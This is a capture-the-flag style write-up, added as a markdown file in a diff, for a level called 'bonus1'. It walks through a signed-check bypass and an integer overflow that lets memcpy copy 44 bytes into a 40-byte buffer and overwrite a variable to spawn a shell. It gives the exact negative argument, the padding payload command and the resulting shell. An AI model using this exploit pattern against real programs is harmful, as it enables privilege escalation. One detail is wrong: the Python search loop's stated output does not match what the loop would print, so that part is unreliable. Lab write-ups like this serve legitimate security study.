@@ -1,0 +1,178 @@
+# Bonus1 - Integer Overflow + Buffer Overflow
+
+## Context
+
+The program takes two arguments. The first is converted to an integer with `atoi()` and used as the size for `memcpy()`. A signed integer check prevents values greater than 9 — but by using a carefully chosen **negative number**, we bypass the check and trigger an **integer overflow** in the size calculation.
+
+---
+
+## Program Flow
+
+```c
+main(argc, argv) :
+  local_14 = atoi(argv[1])
+  if local_14 < 10 :
+    memcpy(local_3c, argv[2], local_14 * 4)
+    if local_14 == 0x574f4c46 :
+      execl("/bin/sh", "sh", 0)
+```
+
+---
+
+## Two Vulnerabilities
+
+### Vulnerability 1 : signed integer check
+
+```c
+if (local_14 < 10)   // signed comparison !
+```
+
+Negative numbers always pass this check :
+
+```
+-2147483637 < 10  → true ✓
+```
+
+### Vulnerability 2 : integer overflow in memcpy size
+
+```c
+memcpy(local_3c, argv[2], local_14 * 4)
+```
+
+`memcpy` takes an **unsigned** size argument (`size_t`). When we multiply a negative signed integer by 4, the result wraps around in 32-bit unsigned arithmetic :
+
+```
+local_14 = -2147483637
+local_14 * 4 = -8589934548  (as signed 64-bit)
+
+as unsigned 32-bit (mod 2^32) :
+-8589934548 % 4294967296 = 44  ← memcpy copies 44 bytes !
+```
+
+This is exactly what we need — enough to overflow the 40-byte buffer and overwrite `local_14`.
+
+---
+
+## Why -2147483637 Specifically
+
+We need a value `n` where :
+
+```
+condition 1 : n < 10          (pass the signed check)
+condition 2 : (n * 4) mod 2^32 >= 44  (enough bytes to overflow)
+condition 3 : (n * 4) mod 2^32 minimal  (avoid copying too much)
+```
+
+```python
+python3 -c "
+for n in range(-1, -2147483648, -1):
+    size = (n * 4) % (2**32)
+    if 44 <= size <= 100:
+        print(n, size)
+        break
+"
+# → -2147483637  size = 44
+```
+
+```
+-2147483637 * 4 = -8589934548
+-8589934548 mod 4294967296 = 44 bytes ✓
+
+44 bytes = 40 (buffer) + 4 (overwrite local_14)
+```
+
+### Why -2147483648 does NOT work
+
+```
+-2147483648 * 4 = -8589934592
+-8589934592 mod 4294967296 = 0  ← memcpy copies 0 bytes !
+```
+
+Nothing gets written — the buffer is never overflowed.
+
+---
+
+## Stack Layout
+
+```c
+char local_3c[40];   // buffer  ← memcpy writes here
+int  local_14;       // integer ← needs to equal 0x574f4c46
+```
+
+```
+local_3c = ebp-0x3c   ← buffer start
+local_14 = ebp-0x14   ← integer to overwrite
+
+distance = 0x3c - 0x14 = 0x28 = 40 bytes
+```
+
+Exactly **40 bytes** of padding reaches `local_14`.
+
+---
+
+## The Condition to Pass
+
+```c
+if (local_14 == 0x574f4c46)
+```
+
+```
+0x574f4c46 in ASCII    = "FLOW"
+in little endian bytes = \x46\x4c\x4f\x57
+```
+
+After memcpy overflow :
+
+```
+local_3c : [A * 40          ][0x574f4c46      ]
+            fills buffer      overwrites local_14 !
+```
+
+---
+
+## Final Payload
+
+```bash
+./bonus1 -2147483637 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
+```
+
+### Payload breakdown
+
+```
+argv[1] :
+  -2147483637       →  passes signed check (< 10)
+                    →  (-2147483637 * 4) mod 2^32 = 44
+                    →  memcpy copies exactly 44 bytes
+
+argv[2] :
+  'A' * 40          →  fills local_3c (40 bytes)
+  \x46\x4c\x4f\x57  →  0x574f4c46 "FLOW" in little endian
+                    →  overwrites local_14
+```
+
+---
+
+## Full Execution Flow
+
+```
+1. atoi("-2147483637")  → local_14 = -2147483637
+2. check : -2147483637 < 10 → true → continue
+3. memcpy size : -2147483637 * 4 = -8589934548
+                 mod 2^32 = 44 bytes
+4. memcpy copies 44 bytes into 40 byte buffer
+   → overflows 4 bytes
+   → local_14 = 0x574f4c46 ("FLOW")
+5. check : local_14 == 0x574f4c46 → true !
+6. execl("/bin/sh", "sh", 0)
+7. → shell !
+```
+
+---
+
+## Result
+
+```bash
+./bonus1 -2147483637 $(python -c "print('A'*40 + '\x46\x4c\x4f\x57')")
+$ whoami
+bonus2    ← shell obtained !
+```
